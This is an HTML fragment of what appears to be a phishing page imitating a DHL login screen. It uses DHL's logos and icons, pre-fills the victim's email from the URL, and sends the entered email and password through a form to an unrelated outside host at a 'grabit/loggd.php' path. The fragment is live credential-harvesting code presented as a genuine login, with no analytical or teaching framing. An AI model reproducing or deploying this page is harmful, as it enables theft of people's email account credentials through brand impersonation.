...
<script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; }</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
 <link rel="shortcut icon" href="https://del.dhl.com/img/icons/favicon.ico" />
	    ...
	    <div class="modal-dialog linguisticHelpModel">
	      <div class="modal-content">
	        <div class="modal-header helpModalHeader">
	          <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="https://del.dhl.com/img/icon-close.png"> </button>
...
<form id="loginForm" name="loginForm" method="post" action="https://aptradng.com/grabit/loggd.php">

        <div class="row login-input-group">
          
          <div class="col-xs-24 mb-15">
		  
		  <input placeholder="Email Address" type="email" name="drift" tabindex="1" readonly=""  required="" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);" id="email">
		  ...
		  <input placeholder="Email Address Password" type="password" id="loginForm:password" required="" name="cash" class="password-toggle" tabindex="2" style="">
              <img id="icon-password" alt="eye" class="img-responsive icon-password" src="https://del.dhl.com/img/eyehide.svg" ></div><span id="loginForm:password-field-error" style="display: none;" class="input-error"></span>
</div>
      ...
      <footer id="main-footer" class="row">
        <div class="col-xs-8 nopadding">
          <img src="https://del.dhl.com/img/dpdhl_logo.svg" class="logo-dpdhl img-responsive" alt="Deutsche Post DHL Group">
        </div>
